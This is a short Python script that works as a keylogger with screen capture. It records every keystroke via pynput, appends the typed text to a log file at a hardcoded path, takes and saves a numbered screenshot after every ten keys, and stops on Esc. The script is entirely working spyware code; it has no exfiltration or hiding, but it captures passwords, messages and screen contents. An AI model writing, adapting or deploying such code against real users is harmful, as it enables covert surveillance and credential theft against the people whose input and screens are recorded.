import os
import sched
import time

from pyautogui import screenshot
from pynput.keyboard import Key, Listener

count = 0
number = 0
imgFolderName = "imgs"
keys = []
keys_readable = []
s = sched.scheduler(time.time, time.sleep)

files = os.listdir(imgFolderName)
for name in files:
    number += 1


def on_press(key):
    global keys, count, number, imgFolderName

    keys_readable.append(key)
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys, "../../../../PycharmProjects/qlogger/qlog.txt")
        takeSS(imgFolderName, number)
        number += 1
        keys = []


def on_release(key):
    if (key == Key.esc): return False


def write_file(keys, fileName):
    with open(fileName, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("Key") == -1:
                f.write(k)


def takeSS(folderName, number):
    myScreenshot = screenshot()
    myScreenshot.save(folderName + "/IMG_" + str(number) + ".png")
    print("SAVED TO " + folderName + "/IMG_" + str(number) + ".png")


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
